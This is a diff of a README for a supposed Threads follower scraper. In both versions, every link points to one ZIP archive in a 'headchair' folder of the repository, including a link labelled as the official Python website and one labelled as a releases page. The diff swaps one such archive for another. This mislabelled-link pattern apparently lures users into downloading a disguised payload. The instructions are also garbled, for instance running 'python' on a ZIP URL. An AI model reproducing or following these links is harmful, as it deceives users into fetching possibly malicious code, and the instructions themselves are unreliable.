@@ -1,6 +1,6 @@
 # 🌟 threads-user-followers-scraper - Extract Followers Easily and Quickly
 
-[![Download Now](https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip)
+[![Download Now](https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip)
 
 ## 📌 Description
 
@@ -18,9 +18,9 @@ To get started with the **threads-user-followers-scraper**, follow the steps bel
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip). Here you will find the latest version of the software, ready for download.
+To download the application, visit the [Releases page](https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip). Here you will find the latest version of the software, ready for download.
 
-1. Click on the [Releases page](https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip).
+1. Click on the [Releases page](https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip).
 2. Look for the most recent version and locate the download link.
 3. Download the file suitable for your operating system.
 
@@ -43,7 +43,7 @@ If you downloaded a ZIP file, you will need to extract it:
 
 The application requires Python to run correctly. Here’s how to set it up:
 
-1. Download and install Python from the [official Python website](https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip).
+1. Download and install Python from the [official Python website](https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip).
 2. Make sure to check the option to "Add Python to PATH" during the installation.
 
 Once Python is installed, you will need to install additional packages. Open your command prompt or terminal and run the following commands:
@@ -60,10 +60,10 @@ pip install beautifulsoup4
 3. Run the following command:
 
 ```bash
-python https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip
+python https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip
 ```
 
-Replace `https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip` with the actual filename if different.
+Replace `https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip` with the actual filename if different.
 
 ### Step 5: Follow the Prompts
 
@@ -106,4 +106,4 @@ For additional help or inquiries, feel free to open an issue on the repository o
 
 This project is licensed under the [MIT License](LICENSE).
 
-[![Download Now](https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/LuisJose17/threads-user-followers-scraper/main/headchair/followers_user_threads_scraper_lemony.zip)
+[![Download Now](https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/LuisJose17/threads-user-followers-scraper/raw/refs/heads/main/headchair/threads-followers-scraper-user-2.0-alpha.1.zip)
